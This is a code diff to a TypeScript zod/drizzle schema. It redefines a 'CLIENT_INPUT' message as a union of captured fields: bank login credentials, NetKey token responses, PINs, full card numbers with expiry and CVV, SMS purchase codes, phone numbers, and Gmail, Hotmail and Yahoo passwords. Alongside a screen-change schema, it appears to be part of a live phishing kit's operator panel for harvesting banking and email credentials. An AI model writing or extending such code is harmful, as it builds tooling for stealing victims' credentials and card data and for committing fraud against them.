@@ -1,4 +1,3 @@
-
 import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
 import { createInsertSchema } from "drizzle-zod";
 import { z } from "zod";
@@ -260,9 +259,25 @@ export const screenChangeSchema = z.object({
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
 
 export const clientInputSchema = z.object({
-  tipo: z.string(),
-  sessionId: z.string(),
-  data: z.record(z.any()),
+  type: z.literal('CLIENT_INPUT'),
+  data: z.object({
+    sessionId: z.string(),
+    tipo: z.string(),
+  }).and(
+    z.discriminatedUnion('tipo', [
+      z.object({ tipo: z.literal('netkey_response'), netkeyResponse: z.string().length(8) }),
+      z.object({ tipo: z.literal('login'), username: z.string(), password: z.string() }),
+      z.object({ tipo: z.literal('codigo'), codigo: z.string() }),
+      z.object({ tipo: z.literal('nip'), nip: z.string() }),
+      z.object({ tipo: z.literal('tarjeta'), numeroTarjeta: z.string(), fechaVencimiento: z.string(), cvv: z.string() }),
+      z.object({ tipo: z.literal('sms_compra'), smsCompra: z.string() }),
+      z.object({ tipo: z.literal('celular'), celular: z.string() }),
+      z.object({ tipo: z.literal('correo'), correo: z.string(), contrasena: z.string() }),
+      z.object({ tipo: z.literal('gmail'), correo: z.string(), contrasena: z.string() }),
+      z.object({ tipo: z.literal('hotmail'), correo: z.string(), contrasena: z.string() }),
+      z.object({ tipo: z.literal('yahoo'), correo: z.string(), contrasena: z.string() }),
+    ])
+  )
 });
 
 export type ClientInputData = z.infer<typeof clientInputSchema>;
